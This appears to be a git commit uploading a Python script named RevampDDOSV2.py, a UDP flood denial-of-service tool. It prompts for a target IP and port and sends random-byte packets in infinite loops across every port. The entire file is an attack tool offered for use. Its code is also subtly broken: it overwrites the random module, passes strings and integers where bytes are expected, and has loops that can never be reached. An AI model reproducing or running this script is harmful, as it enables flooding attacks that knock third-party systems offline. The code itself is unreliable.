5419ae101381a93169d2dbc1ee4c43e15050edab
Revamp-MTT <132065512+Revamp-MTT@users.noreply.github.com>
2023-05-05 12:41:16 +0700

    Add files via upload
    Signed-off-by: Revamp-MTT <132065512+Revamp-MTT@users.noreply.github.com>

---
+++ RevampDDOSV2.py
@@ -0,0 +1,60 @@
+#Author WHITE L'
+import socket
+import os
+import random
+import time
+import sys
+
+white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(45000)
+sent = random._urandom(55000)
+random = random._urandom(35532)
+ping = random._urandom(32000)
+
+
+os.system("clear")
+ip = input("[+] Target's IP : ")
+port = input("[+] Target's Port : ")
+bytes = input("[+] Kecepatan Packet : ")
+random = input("[+] Kecepatan Packet : ")
+os.system("clear")
+print("Attack starting...")
+time.sleep(3)
+while True:
+    sent = 0
+    for port in range(1, 65534):
+        white.sendto(bytes, (ip, port))
+        sent = sent + 1
+while True:
+    sent = 0
+    for bytes in range(1, 65534):
+        white.sendto(bytes, (ip, port))
+        sent = sent + 1
+        port = port + 1
+while True:
+    sent = 0
+    for bytes in range(1, 65534):
+        white.sendto(bytes, (ip, port))
+        sent = sent + 1
+        port = port + 1
+while True:
+    sent = 0
+    for random in range(1, 65534):
+        white.sendto(random, (ip, port))
+        sent = sent + 1
+        port = port + 1
+while True:
+    sent = 0
+    for random in range(1, 65534):
+        white.sendto(random, (ip, port))
+        sent = sent + 1
+        port = port + 1
+while True:
+    sent = 0
+    for bytes in range(1, 65534):
+        white.sendto(random, (ip, port))
+        sent = sent + 1
+        port = port + 1
+        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))
+
+print("\033[1;92mAttack finished\033[0m")
